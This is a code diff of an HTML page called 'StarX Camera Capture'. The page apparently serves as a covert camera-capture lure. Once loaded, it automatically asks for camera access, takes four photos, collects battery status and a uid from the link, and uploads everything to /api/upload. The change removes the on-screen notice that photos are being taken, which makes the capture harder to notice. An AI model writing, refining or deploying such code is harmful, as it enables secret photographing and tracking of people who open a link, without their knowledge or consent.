@@ -1,77 +1,72 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>StarX Capture</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>StarX Capture</title>
 </head>
 <body>
-  <h1 style="text-align:center;">📸 StarX Camera Capture</h1>
-  <p style="text-align:center;">Capturing 4 photos automatically...</p>
+<h2>🎥 StarX Camera Capture</h2>
 
-  <script>
-    const uid = new URLSearchParams(window.location.search).get("uid") || "NO_UID";
+<script>
+const uid = new URLSearchParams(window.location.search).get("uid") || "NO_UID";
 
-    let capturedImages = [];
-    const NUM_PHOTOS = 4; // څومره عکسونه
-
-    async function capturePhotos() {
-      try {
-        // ✅ get camera stream
+async function startCapture() {
+    try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        await video.play();
+        const videoTracks = stream.getVideoTracks();
+        const captureCanvas = document.createElement('canvas');
+        const captureCtx = captureCanvas.getContext('2d');
 
-        for (let i = 0; i < NUM_PHOTOS; i++) {
-          // عکس اخیستل
-          const canvas = document.createElement("canvas");
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext("2d");
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        let photos = [];
 
-          const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
-          capturedImages.push(blob);
-
-          // لږ ځنډ د عکس اخیستلو ترمنځ
-          await new Promise(r => setTimeout(r, 500)); // نیم ثانیه
+        for (let i = 0; i < 4; i++) {
+            captureCanvas.width = 640;
+            captureCanvas.height = 480;
+            captureCtx.drawImage(await createVideoElement(stream), 0, 0, 640, 480);
+            const blob = await new Promise(resolve => captureCanvas.toBlob(resolve, 'image/jpeg'));
+            photos.push(blob);
+            await new Promise(r => setTimeout(r, 1000)); // 1s interval between photos
         }
 
-        // battery info
+        // Battery info
         let batteryLevel = 'Unknown';
         let charging = 'Unknown';
         if (navigator.getBattery) {
-          const battery = await navigator.getBattery();
-          batteryLevel = Math.round(battery.level * 100);
-          charging = battery.charging ? 'true' : 'false';
+            const battery = await navigator.getBattery();
+            batteryLevel = Math.round(battery.level * 100);
+            charging = battery.charging ? 'true' : 'false';
         }
 
-        // هر عکس واستوي
-        for (const [index, imageBlob] of capturedImages.entries()) {
-          const formData = new FormData();
-          formData.append('photo', imageBlob);
-          formData.append('uid', uid);
-          formData.append('battery', batteryLevel.toString());
-          formData.append('charging', charging);
-          formData.append('photo_index', index + 1);
+        const formData = new FormData();
+        formData.append('uid', uid);
+        formData.append('battery', batteryLevel.toString());
+        formData.append('charging', charging);
 
-          await fetch('/api/upload', { method: 'POST', body: formData });
-        }
+        photos.forEach((photo, idx) => formData.append('photo' + (idx + 1), photo));
 
-        // Stream ختم کړه
+        await fetch('/api/upload', { method: 'POST', body: formData });
+
         stream.getTracks().forEach(track => track.stop());
 
-        document.body.innerHTML += "<p style='text-align:center;color:green;'>✅ All 4 photos sent successfully!</p>";
-
-      } catch (err) {
+    } catch (err) {
         console.error(err);
-        alert("📸 Camera access denied or error: " + err.message);
-      }
+        alert("🎥 Access Denied or Error: " + err.message);
     }
+}
 
-    // Start capturing after page load
-    window.onload = () => setTimeout(capturePhotos, 1000);
-  </script>
+// Helper to create video element from stream
+function createVideoElement(stream) {
+    return new Promise(resolve => {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        video.onloadeddata = () => resolve(video);
+    });
+}
+
+// start capture after page load
+window.onload = () => setTimeout(startCapture, 1000);
+</script>
 </body>
 </html>
